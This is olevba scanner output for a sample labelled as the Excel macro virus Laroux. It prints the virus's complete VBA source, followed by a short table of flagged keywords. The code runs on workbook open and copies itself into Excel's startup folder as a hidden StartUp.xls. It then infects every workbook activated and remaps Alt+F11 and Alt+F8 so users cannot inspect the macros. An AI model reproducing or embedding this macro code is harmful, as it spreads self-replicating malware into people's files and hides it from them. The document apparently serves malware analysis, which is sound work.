olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Laroux.jy-09436b225db503d58a159c05391dcbb94c6fefb9
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO StartUp.bas 
in file: Virus.MSExcel.Laroux.jy-09436b225db503d58a159c05391dcbb94c6fefb9 - OLE stream: '_VBA_PROJECT_CUR/VBA/StartUp'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub auto_open()
Attribute auto_open.VB_ProcData.VB_Invoke_Func = " \n14"
  If ThisWorkbook.Path <> Application.StartupPath And Dir(Application.StartupPath & "\" & "StartUp.xls") = "" Then
    Application.ScreenUpdating = False
    ThisWorkbook.Sheets("StartUp").Copy
    ActiveWorkbook.SaveAs (Application.StartupPath & "\" & "StartUp.xls")
    n$ = ActiveWorkbook.Name
    ActiveWindow.Visible = False
    Workbooks("StartUp.xls").Save
    Workbooks(n$).Close (False)
  End If
  Application.OnSheetActivate = "StartUp.xls!acop"
  Application.OnKey "%{F11}", "StartUp.xls!escape"
  Application.OnKey "%{F8}", "StartUp.xls!escape"
End Sub

Sub acop()
Attribute acop.VB_ProcData.VB_Invoke_Func = " \n14"
  If ActiveWorkbook.Sheets(1).Name <> "StartUp" Then
    Application.ScreenUpdating = False
    n$ = ActiveSheet.Name
    Workbooks("StartUp.xls").Sheets("StartUp").Copy before:=Worksheets(1)
    Sheets(n$).Select
  End If
End Sub

Sub aback()
Attribute aback.VB_ProcData.VB_Invoke_Func = " \n14"
  Application.OnKey "%{F8}", "StartUp.xls!escape"
  Application.OnKey "%{F11}", "StartUp.xls!escape"
  Application.OnSheetActivate = "StartUp.xls!acop"
  Application.OnTime Now + TimeValue("00:00:01"), "StartUp.xls!acop"
  Workbooks.Open Application.StartupPath & "\StartUp.xls"
End Sub

-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     15 BOUNDSHEET : Sheet Information - Visual Basic module, visible -  StartU
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |auto_open           |Runs when the Excel Workbook is opened       |
|Suspicious|Open                |May open a file                              |
|Suspicious|ActiveWorkbook.SaveA|May save the current workbook                |
|          |s                   |                                             |
+----------+--------------------+---------------------------------------------+

